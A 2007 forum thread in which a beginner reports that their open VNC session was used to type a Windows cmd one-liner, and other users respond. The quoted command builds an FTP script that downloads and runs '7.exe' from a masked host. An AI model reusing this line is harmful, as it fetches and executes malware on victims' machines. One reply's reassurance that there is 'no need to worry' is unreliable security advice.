---
title: "Do I need to worry about this hacker?"
date: 2007-03-20
forum: Server Platforms
---

### Post by Docter on 2007-03-20
Hi. I have a simple home network on a crossover LAN with two ubuntus (edgy) sharing an ADSL USB modem connection. While setting up it was convenient to allow remote desktop on both computers to save too many trips up and down the stairs.

Now, to aid my user I disabled the password authentication as a temporary measure but today while running ```
dpkg-reconfigure -a
``` this was spat out in my terminal
```

Caching application data...
Got non-package menu entry kiso.desktop
Got non-package menu entry k3dsurf.desktop
Got non-package menu entry xchm.desktop
Got non-package menu entry grdesktop.desktop
Got non-package menu entry tsclient.desktop
Got non-package menu entry brasero.desktop
Got non-package menu entry kmyfirewall.desktop
Generating mime map...

.^[[B^[[B^[[B^[[B
^[[B
%systemroot%\system32\cmd.exe
cmd /c echo open xx.xx.xx.xx xxxx >> ik &echo user james 12198841 >> ik &echo get 7.exe >> ik &echo bye >> ik &ftp -n -v -s:ik &del ik &7.exe &exit
```

To me it looked like a bunch of escape characters and some windoze like commands so I disconnected my modem from the phone line.

I'm very much a beginner at this, what networking I've done I've usually let windoze take care of. I am an oldskool developer though so I don't mind technical problems. I've now reset the password and I am getting round to using a more secure ssh script to acheive my ends but my question is do I need to worry about user James? Also should I worry about 7.exe which seems liek a windoze prog? Basically is there any advice from you lovely people as to what I should do or investigate?

Many thanks.

doc

My question is..

---

### Post by Frosty Cold Drink on 2007-03-20
First, this attempt likeley didn't come from a hacker, or even a "hacker". Its either a worm going around, or someome blindly attempting to exploit large numbers of machines.

No, there is no need to worry so long as you have decent passwords setup and have VNC updated.

---

### Post by Docter on 2007-03-20
Makes sense to me. Many thanks Frosty.

---

### Post by Mr. C. on 2007-03-20
Docter,

You are not the first to see this.  Please spend some time reviewing this thread:

[http://www.ubuntuforums.org/showthread.php?t=378028](http://www.ubuntuforums.org/showthread.php?t=378028)

Because you do not know what or how someone gained access to your system, you *do* have cause for concern.

MrC

---

### Post by jenhsun on 2007-03-20
> **Mr. C. said:**
> Docter,

You are not the first to see this.  Please spend some time reviewing this thread:

[http://www.ubuntuforums.org/showthread.php?t=378028](http://www.ubuntuforums.org/showthread.php?t=378028)

Because you do not know what or how someone gained access to your system, you *do* have cause for concern.

MrC

YES!
As a ubuntu server beginner, that's what I am looking for.

---

